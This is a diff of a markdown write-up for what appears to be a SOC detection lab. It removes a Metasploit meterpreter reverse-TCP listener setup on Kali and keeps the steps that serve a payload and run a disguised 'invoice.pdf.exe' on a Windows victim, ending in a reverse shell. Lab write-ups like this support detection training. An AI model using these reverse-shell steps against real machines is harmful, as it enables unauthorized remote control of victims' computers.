@@ -108,17 +108,6 @@ python3 -m http.server 9999
 ### 6. Executing the Payload on the Victim Machine
 The payload is executed on the Windows victim machine, establishing a reverse shell back to Kali.
 
-On Kali — set up the listener first:
-
-```bash
-msfconsole -q
-use exploit/multi/handler
-set payload windows/x64/meterpreter_reverse_tcp
-set LHOST <KALI_IP>
-set LPORT 4444
-exploit
-```
-
 On the victim (PowerShell or CMD):
 
 ```cmd
@@ -128,7 +117,6 @@ C:\Users\ericn\Downloads\invoice.pdf.exe
 A reverse shell session is now active on the attacker machine.
 
 <p>
-  <img src="soc-detection-lab/window_binary_running.png" width="500"/>
   <img src="soc-detection-lab/running.png" width="500"/>
   <img src="soc-detection-lab/reverse_shell_active.png" width="500"/>
 </p>
